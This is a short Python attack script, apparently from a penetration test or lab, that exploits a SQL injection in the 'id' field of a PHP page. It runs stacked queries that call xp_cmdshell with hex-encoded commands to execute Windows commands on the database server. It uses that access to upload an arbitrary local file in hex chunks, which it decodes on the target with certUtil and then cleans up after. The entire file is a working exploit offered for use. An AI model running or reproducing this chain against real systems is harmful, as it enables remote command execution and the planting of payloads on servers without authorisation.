import binascii
import sys
import requests


def exec_xp_cmdshell(cmd):
    url = 'http://10.37.129.4/sql.php'
    payload = "1';DECLARE @bjxl VARCHAR(8000);SET @bjxl=0x%s;EXEC master..xp_cmdshell @bjxl-- ZKN" % binascii.hexlify(
        cmd.encode()).decode()
    requests.post(url, data={"id": payload})


def main():
    if len(sys.argv) < 3:
        print("Usage: python3 upload.py local_file_to_read remote_path_to_save")
        sys.exit(1)

    cmd = '''>>"{path}" set /p="{content}"<nul'''
    file = open(sys.argv[1], 'rb')
    path_to_save = sys.argv[2]
    exec_xp_cmdshell('cd . > "{}"'.format(path_to_save + '.tmp'))
    while 1:
        content = file.read(512)
        payload = cmd.format(path=path_to_save + '.tmp', content=binascii.hexlify(content).decode())
        exec_xp_cmdshell(payload)
        if len(content) < 512:
            break
    exec_xp_cmdshell('certUtil -decodehex "{old_path}" "{new_path}"'.format(old_path=path_to_save + '.tmp', new_path=path_to_save))
    exec_xp_cmdshell('del "{}"'.format(path_to_save + '.tmp'))
    print('Uploaded successfully!')


if __name__ == '__main__':
    main()
